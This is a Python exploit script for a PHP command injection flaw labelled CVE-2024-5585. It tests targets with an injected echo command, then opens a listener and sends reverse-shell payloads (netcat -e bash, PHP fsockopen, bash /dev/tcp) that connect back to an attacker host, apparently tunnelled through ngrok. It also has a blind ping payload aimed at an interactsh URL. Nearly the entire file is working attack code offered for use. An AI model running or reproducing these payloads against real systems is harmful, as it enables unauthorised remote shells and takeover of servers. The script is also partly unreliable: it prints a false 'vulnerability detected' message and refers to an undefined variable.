# Command Injection & Remote Code Execution

# Regex version:
# ^8\.1\.(?:[0-9]|[1-2][0-8])$|^8\.2\.(?:[0-9]|1[0-9])$|^8\.3\.(?:[0-7])$

import requests
import sys
import subprocess
import argparse
import time
import socket 
import select  
import threading  
from urllib.parse import urlparse, parse_qs
from urllib.parse import urlparse, urlunparse



# check vulnerability verifying response with 'echo' command 
def vulnerable_check(m, url, body=None):
    test_payload = " \"\\\"echo r0b0ts\""
    
    content_type = content_type_verify(url, m)
    if not content_type:
        print("[!] Content-Type not found. Proceeding without Content-Type.")

    try:
        if not body:
            url = url.replace("*", test_payload)
        else:
            body = body.replace("*", test_payload)

        headers = {'Content-Type': content_type} if content_type else {}  
        res = getattr(requests, m)(url, headers=headers, data=body, timeout=10)
        
        if "r0b0ts" in res.text:
            result = "0"
        else:
            result = "1"
    except requests.exceptions.Timeout:
        print("[!] Vulnerable Check request timed out.")
    except Exception as e:
        print(f"[!] Error during vulnerability check: {e}")
        sys.exit(1)

    if result == "0":
        print("[+] Detected Vulnerability : True\n")
    else:
        print("[-] Detected Vulnerability : False\n")
    
    return result
            
# Get content-type for sending payload in request body  
def content_type_verify(url, m):
    try:
        parsed_url = urlparse(url)
        test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, '', '', ''))

        try:
            response = getattr(requests,m)(test_url, timeout=10)
            content_type = response.headers.get('Content-Type', None)  
            return content_type
        except requests.exceptions.Timeout:
            print("[!] Vulnerable Check request timed out.")
    except Exception as e:
        print(f"[!] Error during content-type verification: {e}")
        sys.exit(1)
    
    
# Setting server listening on attcker side 
def start_listening(fport):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", int(fport)))
        server_socket.listen(1)
        client_socket, addr = server_socket.accept()
        client_socket.setblocking(0)
        print("[+] Receive Shell Success!!")
        print("\n[*] Put your command:")
        inputs = [sys.stdin, client_socket]
        outputs = [client_socket]

        while True:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for s in readable:
                if s is client_socket:
                    response = s.recv(4096)
                    if not response:
                        return                    
                    print(response.decode(errors="replace").strip())
                    print("-"*100)

                else:
                    command = s.readline().strip()
                    if command:
                        client_socket.send(command.encode() + b"\n")

            for s in exceptional:
                return

    finally:
        if server_socket:
            server_socket.close()
        if client_socket:
            client_socket.close()

# Send reverse shell script
def send_attack_request(lhost, lport, url, m, content_type, body=None):
    payloads = [f" \"\\\"nc.exe {lhost} {lport} -e bash\"", f" \"\\\"ncat.exe {lhost} {lport} -e bash\"", f" \"\\\"php -r '$sock=fsockopen(\"{lhost}\",{lport});`bash <&3 >&3 2>&3`;'\"", f" \"\\\"php -r '$sock=fsockopen(\"{lhost}\",{lport});system(\"bash <&3 >&3 2>&3\");'\"", f" \"\\\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\""]    
    for payload in payloads:
        try:
            if not body:
                url = url.replace("*", payload)
            else:
                body = body.replace("*", payload)

            headers = {'Content-Type': content_type} if content_type else {}  
            res = getattr(requests, m)(url, headers=headers, data=body, timeout=10)
            print(f"[O] Payload sent. Response: {res.status_code}")
        except requests.exceptions.Timeout:
            print("[!] Vulnerable Check request timed out.")
        except Exception as e:
            print(f"[!] Error during payload delivery: {e}")
    
    
parser = argparse.ArgumentParser(usage="""CVE-2024-5585.py -u https://*.*.*.*/index.php?session=* -m post -lp 14143 -lh 0.tcp.jp.ngrok.io -fp 4444""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--method', '-m', help='Request method', required=False, default="get")
parser.add_argument('--body', '-b', help='Request body', required=False)
parser.add_argument('--lhost', '-lh', help='Local host for reverse shell', required=False)
parser.add_argument('--lport', '-lp', help='Local port for reverse shell', required=False)
parser.add_argument('--fport', '-fp', help='Forward port through ngrok', required=False)
args = parser.parse_args()


#Parsing URL as protocol, host, path
parsed_url = urlparse(args.URL)     
path = parsed_url.path   
parameters = parse_qs(parsed_url.query)

url = args.URL.rstrip('/')
m = args.method.lower()

# mode check
mode = 0 # URL mode
if not path:
    print("[+] Detected Vulnerability : True\n")
    print("Include directory in url to check vulnerability!")
    sys.exit()
    
if not parsed_url.query: 
    if args.body:
        mode = 1 # Request body mode
    else:
        print("[+] Detected Vulnerability : True\n")
        print("Include directoty & parameters in url to check vulnerability!")
        sys.exit()


result = vulnerable_check(m, url, args.body)

header_type = content_type_verify(url,m)

    
try:
    if args.lhost and args.lport and args.fport:
        if result == "0": # RCE
            # Start reverse shell connection 
            print("[+] Start listening.....")
            listen_thread = threading.Thread(target=start_listening, args=(args.fport,))
            print("[+] Sending attack payload.....")
            request_thread = threading.Thread(target=send_attack_request, args=(args.lhost, args.lport, url, m, header_type, args.body))
            listen_thread.start()
            request_thread.start()
            request_thread.join()
            
        elif result == "1": #Blind Command Injection
            interactsh = input("[*] Put your interactsh-url for Blind Command Injection test:")
            blind_payload = f" \"\\\"ping {interactsh}\""
            
            if not args.body:
                url = url.replace("*", blind_payload)
                args.body = None
            else:
                body = body.replace("*", blind_payload)
            
            try:
                print("[+] Sending attack payload.....")
                headers = {'Content-Type': header_type} if header_type else {}  
                getattr(requests, m)(url, headers=headers, data=args.body, timeout=10)
            except requests.exceptions.Timeout:
                print("[!] Vulnerable Check request timed out.")
        else:
            print("[!] Something error in vulnerable result")
except Exception as e:
    print(f"[!] An error occurred: {e}")
    sys.exit(1)